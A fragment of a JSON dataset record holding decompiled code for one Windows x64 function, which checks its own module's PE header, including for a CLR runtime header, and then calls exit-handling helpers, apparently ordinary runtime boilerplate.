        "decompiled_code": "\nvoid fcn.140016b34(ulong arg1)\n\n{\n    code *pcVar1;\n    int16_t *piVar2;\n    int32_t *piVar3;\n    uint auStackX16 [2];\n    int32_t aiStackX24 [2];\n    uchar auStackX32 [8];\n    uchar auStack56 [4];\n    uint uStack52;\n    uint auStack48 [2];\n    ulong uStack40;\n    uint *puStack32;\n    int32_t *piStack24;\n    uchar *puStack16;\n    \n    aiStackX24[0] = 0;\n    auStackX16[0] = 0;\n    uStack40 = 0xfffffffffffffffe;\n    piVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    if ((((piVar2 != NULL) && (*piVar2 == 0x5a4d)) && (piVar3 = *(piVar2 + 0x1e) + piVar2,  *piVar3 == 0x4550)) &&\n       (((*(piVar3 + 6) == 0x20b && (0xe < piVar3[0x21])) && (piVar3[0x3e] != 0)))) {\n        fcn.140016a50(arg1);\n    }\n    auStackX32[0] = 0;\n    puStack32 = auStackX16;\n    piStack24 = aiStackX24;\n    puStack16 = auStackX32;\n    uStack52 = 2;\n    auStack48[0] = 2;\n    fcn.140016820(auStack56, auStack48, &puStack32, &uStack52);\n    if (aiStackX24[0] == 0) {\n        fcn.1400169ec(arg1);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 430
    }
}